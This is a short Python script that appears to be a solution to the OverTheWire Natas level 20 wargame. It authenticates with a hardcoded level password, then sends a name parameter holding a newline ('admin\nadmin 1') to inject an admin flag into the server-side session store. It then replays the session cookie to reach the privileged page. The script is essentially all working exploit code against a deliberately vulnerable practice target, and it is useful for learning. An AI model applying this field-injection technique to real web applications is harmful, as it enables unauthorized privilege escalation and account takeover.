import requests

target = 'http://natas20.natas.labs.overthewire.org'
auth = ('natas20', 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF')

params = dict(name='admin\nadmin 1', debug='')
cookies = dict()
r = requests.get(target, auth=auth, params=params, cookies=cookies)
phpsessid = r.cookies['PHPSESSID']
print r.text

print "\n\n"

params = dict(debug='')
cookies = dict(PHPSESSID=phpsessid)
r = requests.get(target, auth=auth, params=params, cookies=cookies)
print r.text
